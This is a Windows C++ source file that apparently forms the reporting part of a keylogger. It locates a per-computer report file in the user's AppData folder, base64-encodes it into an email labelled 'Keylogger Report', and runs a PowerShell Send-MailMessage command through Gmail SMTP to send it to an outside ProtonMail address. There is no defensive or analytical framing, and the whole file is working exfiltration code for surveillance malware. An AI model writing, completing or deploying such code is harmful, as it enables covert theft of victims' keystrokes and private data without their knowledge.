#ifdef _WIN32
#include <Windows.h>
#include <Wincrypt.h>
#include <ShlObj.h>
#else
#error "This program requires Windows"
#endif

#include <string>
#include <fstream>
#include <vector>
#include <cstdlib>
#include <sstream>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")

std::string Base64Encode(const std::string& input) {
    DWORD encodedSize = 0;
    if (!CryptBinaryToStringA(
        reinterpret_cast<const BYTE*>(input.data()), 
        static_cast<DWORD>(input.size()),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        NULL,
        &encodedSize
    )) return "";

    std::string output;
    output.resize(encodedSize);
    if (!CryptBinaryToStringA(
        reinterpret_cast<const BYTE*>(input.data()), 
        static_cast<DWORD>(input.size()),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        &output[0],
        &encodedSize
    )) return "";

    output.resize(encodedSize - 1);
    return output;
}

std::string GetAppDataPath() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
        return std::string(path);
    }
    // Fallback to environment variable
    const char* appData = std::getenv("APPDATA");
    return appData ? std::string(appData) : "";
}

std::string GetComputerName() {
    char name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) {
        return std::string(name, size);
    }
    return "UnknownComputer";
}

void SendEmail(const std::string& attachmentPath) {
    std::string computerName = GetComputerName();
    std::string subject = "Keylogger Report from " + computerName;
    std::string boundary = "BOUNDARY_" + std::to_string(GetTickCount());
    std::string filename = attachmentPath.substr(attachmentPath.find_last_of("\\") + 1);

    // Read PDF content
    std::ifstream file(attachmentPath, std::ios::binary);
    if (!file.is_open()) return;
    
    std::string pdfData(
        (std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>()
    );

    // Build MIME message
    std::ostringstream body;
    body << "From: \"Keylogger\" <your_email@gmail.com>\r\n"
         << "To: \"Recipient\" <elonmasai02@proton.me>\r\n"
         << "Subject: " << subject << "\r\n"
         << "MIME-Version: 1.0\r\n"
         << "Content-Type: multipart/mixed; boundary=\"" << boundary << "\"\r\n\r\n"
         << "--" << boundary << "\r\n"
         << "Content-Type: text/plain; charset=utf-8\r\n"
         << "Content-Transfer-Encoding: 7bit\r\n\r\n"
         << "Attached is the keylogger report\r\n\r\n"
         << "--" << boundary << "\r\n"
         << "Content-Type: application/pdf; name=\"" << filename << "\"\r\n"
         << "Content-Transfer-Encoding: base64\r\n"
         << "Content-Disposition: attachment; filename=\"" << filename << "\"\r\n\r\n"
         << Base64Encode(pdfData) << "\r\n\r\n"
         << "--" << boundary << "--";

    // Build PowerShell command
    std::ostringstream psCommand;
    psCommand << "$smtpServer = 'smtp.gmail.com'\n"
              << "$smtpPort = 587\n"
              << "$username = 'your_email@gmail.com'\n"
              << "$password = 'your_app_password'\n"
              << "$securePass = ConvertTo-SecureString $password -AsPlainText -Force\n"
              << "$credential = New-Object System.Management.Automation.PSCredential($username, $securePass)\n"
              << "Send-MailMessage -From $username -To 'elonmasai02@proton.me' -Subject '" 
              << subject << "' -Body '" << body.str() << "' -SmtpServer $smtpServer "
              << "-Port $smtpPort -UseSsl -Credential $credential -Encoding UTF8";

    // Execute PowerShell
    std::string fullCommand = "powershell -Command \"" + psCommand.str() + "\"";
    system(fullCommand.c_str());
}

int main() {
    std::string appDataPath = GetAppDataPath();
    if (appDataPath.empty()) return 1;
    
    std::string computerName = GetComputerName();
    std::string pdfPath = appDataPath + "\\" + computerName + "_Report.pdf";
    
    SendEmail(pdfPath);
    return 0;
}